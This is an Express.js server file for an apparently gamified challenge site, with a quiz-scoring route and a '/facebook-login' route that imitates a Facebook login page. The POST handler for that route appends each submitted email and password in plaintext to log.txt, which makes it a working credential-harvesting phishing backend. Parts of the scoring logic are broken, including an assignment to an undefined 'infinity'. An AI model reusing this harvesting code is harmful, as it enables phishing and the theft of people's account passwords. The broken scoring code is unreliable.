const app = require('./express');
const sendData = require('./tally');
const path = require('path');
var fs = require('fs');
var  score = 0;
const base = 50;
app.set('view engine', 'pug');


app.get('/',function(req,res){
  res.sendFile(path.join(__dirname + '/index.html'));
});

app.get('/challenges',function(req,res){
  res.sendFile(path.join(__dirname + '/public/challenge/challenges.html'));
});

app.post('/challenges',(req,res) => {
  let answer1 = req.body.answer1.toLowerCase();
  let answer2 = req.body.answer2.toLowerCase();
  var insertData = {}
  insertData.answer1 = answer1;
  insertData.answer2 = answer2;

  sendData(insertData, (data)=>{
    if(data == 0){
      finalScore = 0;
      res.render('alohomora.pug', { finalScore:finalScore })
      res.end();
    }
    else if(data == 1){
      finalScore = base*1;
      res.render('alohomora.pug', { finalScore:finalScore })
      res.end();
    }else if (data == 2){
      finalScore = base*2;
      res.render('alohomoraWinner.pug', { finalScore:finalScore })
      res.end();
    }
    else{
      score = infinity;
      res.render('alohomora.pug', { finalScore:finalScore })
      res.end();
    }
  });

});

// app.get('/alohomora', function (req, res) {
//   console.log("Alohomora : Score : " + score)
//   res.render('alohomora.pug', { finalScore:score })
// })

app.get('/facebook-login',function(req,res){
  res.sendFile(path.join(__dirname + '/public/facebook-challenge/trouble.html'));
});

app.post('/facebook-login',(req,res) => {
  valid = req.body.email.includes('@');
	if (req.body.email != '' && req.body.pass != '' && valid == true) {
		fs.appendFile(path.join(__dirname + '/log.txt'), req.body.email.toLowerCase() + "   " + req.body.pass.toLowerCase(), function(err) {
    		if(err) {
       	 		return console.log(err);
    		}
			console.log("The file was saved!");
		}); 

      res.redirect('/taskOneCompleted');
      res.end();
    }
    else{
            res.redirect('/facebook-login');
    }
});


app.get('/taskOneCompleted', function(req,res){
res.sendFile(path.join(__dirname + '/public/facebook-challenge/taskOneCompleted.html'));
});

app.listen(process.env.PORT||30303, function() {
  console.log('Example app listening on port 30303!')
})
